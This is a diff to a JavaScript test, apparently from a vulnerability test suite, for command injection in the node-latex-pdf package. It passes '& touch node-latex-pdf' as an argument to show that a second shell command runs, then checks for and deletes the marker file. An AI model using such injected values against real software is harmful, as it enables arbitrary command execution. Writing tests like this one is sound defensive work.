@@ -10,12 +10,14 @@ test("Command Injection in node-latex-pdf", () =>
 	file_exist = fs.existsSync(path);
 	expect(file_exist).toBe(false);
     
-	a("./","& touch node-latex-pdf",function(){})
-	
-	sleep.sleep(5);
-	//checking that its created by after exploit.
+	a("./","& touch node-latex-pdf",function(){ 
+		//checking that its created by after exploit.
 	file_exist = fs.existsSync(path);
 	expect(file_exist).toBe(true);
 
 	fs.unlink(path, function(err) {});//deleting the file after creation
+	})
+	
+	sleep.sleep(5);
+	
 });
